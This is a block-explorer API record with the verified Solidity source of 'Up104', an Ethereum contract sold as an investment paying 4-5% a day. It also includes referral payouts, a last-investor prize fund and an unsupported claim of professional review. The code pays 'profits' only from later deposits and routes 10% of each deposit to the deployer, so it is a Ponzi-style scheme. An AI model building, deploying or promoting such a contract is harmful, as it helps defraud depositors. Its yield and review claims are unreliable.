{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.25;\r\n\r\n/**\r\n *\r\n * Up104 Contract\r\n *  - GAIN 4-5% PER 24 HOURS (every 5900 blocks)\r\n *  - 10% of the contributions go to project advertising\r\n *\r\n * How to use:\r\n *  1. Send at least 0.001 Ether to make an investment.\r\n *  2a. Claim your profit by sending 0 Ether transaction (every minute,\r\n *      every day, every week, i don't care unless you're spending too\r\n *      much on GAS).\r\n *  OR\r\n *  2b. Send at least 0.001 Ether to reinvest AND get your profit at the\r\n *      same time.\r\n *  3. Participants with referrers receive 5% instead of 4%.\r\n *  4. To become someone's referral, enter the address of the referrer\r\n *     in the field DATA when sending the first deposit.\r\n *  5. Only a participant who deposited at least 0.001 Ether can become a\r\n *     referrer.\r\n *  6. Referrers receive 10% of each deposit of referrals immediately to\r\n *     their wallet.\r\n *  7. To receive the prize fund, you need to be the last investor for at\r\n *     least 42 blocks (~10 minutes), after which you need to send 0 Ether\r\n *     or reinvest.\r\n *\r\n * RECOMMENDED GAS LIMIT: 200000\r\n * RECOMMENDED GAS PRICE: https://ethgasstation.info/\r\n *\r\n * Contract reviewed and approved by pros!\r\n *\r\n */\r\n \r\ncontract Up104 {\r\n    address support = msg.sender;\r\n    uint public prizeFund;\r\n    address public lastInvestor;\r\n    uint public lastInvestedAt;\r\n    \r\n    uint public totalInvestors;\r\n    uint public totalInvested;\r\n    \r\n    // records amounts invested\r\n    mapping (address => uint) public invested;\r\n    // records blocks at which investments were made\r\n    mapping (address => uint) public atBlock;\r\n    // records referrers\r\n    mapping (address => address) public referrers;\r\n    \r\n    function bytesToAddress(bytes source) internal pure returns (address parsedAddress) {\r\n        assembly {\r\n            parsedAddress := mload(add(source,0x14))\r\n        }\r\n        return parsedAddress;\r\n    }\r\n\r\n    // this function called every time anyone sends a transaction to this contract\r\n    function () external payable {\r\n        require(msg.value == 0 || msg.value >= 0.001 ether);\r\n        \r\n        prizeFund += msg.value * 7 / 100;\r\n        uint transferAmount;\r\n        \r\n        support.transfer(msg.value / 10);\r\n        \r\n        // if sender (aka YOU) is invested more than 0 ether\r\n        if (invested[msg.sender] != 0) {\r\n            uint max = (address(this).balance - prizeFund) * 9 / 10;\r\n            \r\n            // calculate profit amount as such:\r\n            // amount = (amount invested) * (4 - 5)% * (blocks since last transaction) / 5900\r\n            // 5900 is an average block count per day produced by Ethereum blockchain\r\n            uint percentage = referrers[msg.sender] == 0x0 ? 4 : 5;\r\n            uint amount = invested[msg.sender] * percentage / 100 * (block.number - atBlock[msg.sender]) / 5900;\r\n            if (amount > max) {\r\n                amount = max;\r\n            }\r\n\r\n            transferAmount += amount;\r\n        } else {\r\n            totalInvestors++;\r\n        }\r\n        \r\n        if (lastInvestor == msg.sender && block.number >= lastInvestedAt + 42) {\r\n            transferAmount += prizeFund;\r\n            prizeFund = 0;\r\n        }\r\n        \r\n        if (msg.value > 0) {\r\n            if (invested[msg.sender] == 0 && msg.data.length == 20) {\r\n                address referrerAddress = bytesToAddress(bytes(msg.data));\r\n                require(referrerAddress != msg.sender);     \r\n                if (invested[referrerAddress] > 0) {\r\n                    referrers[msg.sender] = referrerAddress;\r\n                }\r\n            }\r\n            \r\n            if (referrers[msg.sender] != 0x0) {\r\n                referrers[msg.sender].transfer(msg.value / 10);\r\n            }\r\n            \r\n            lastInvestor = msg.sender;\r\n            lastInvestedAt = block.number;\r\n        }\r\n\r\n        // record block number and invested amount (msg.value) of this transaction\r\n        atBlock[msg.sender] = block.number;\r\n        invested[msg.sender] += msg.value;\r\n        totalInvested += msg.value;\r\n        \r\n        if (transferAmount > 0) {\r\n            msg.sender.transfer(transferAmount);\r\n        }\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"totalInvestors\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"lastInvestedAt\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"referrers\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalInvested\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"invested\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"atBlock\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"lastInvestor\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"prizeFund\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"Up104","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://6499bed6f5cadbb5d985d0e4c283cbfc7e38423b64832d4b7ff5725829482ecd"}]}